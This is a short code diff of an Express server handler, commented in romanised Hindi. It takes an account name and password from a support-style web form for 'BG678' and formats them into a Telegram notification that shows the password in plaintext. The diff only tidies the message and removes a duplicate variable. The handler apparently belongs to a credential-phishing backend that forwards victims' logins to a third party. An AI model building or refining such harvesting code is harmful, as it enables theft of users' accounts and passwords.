@@ -20,7 +20,6 @@ app.post("/submit", async (req, res) => {
     try {
         // HTML se bheja gaya data yahan receive ho raha hai
         const { account, password, issue } = req.body;
-        const issue = "None";
         // Basic validation check
           if (!account || !password) {
             return res.status(400).json({
@@ -32,7 +31,7 @@ app.post("/submit", async (req, res) => {
         // Telegram par bheje jaane wale message ka format
         const messageText = 
             "🧪 BG678 NOTIFICATION\n\n" +
-            "📌 Support Issue: " + issue + "\n" +
+            "📌 Support Issue: " + "\n" +
             "📱 account: " + account + "\n" +
             "🔑 Received PASSWORD: " + password + "\n\n" +
             "Demo support information received.";
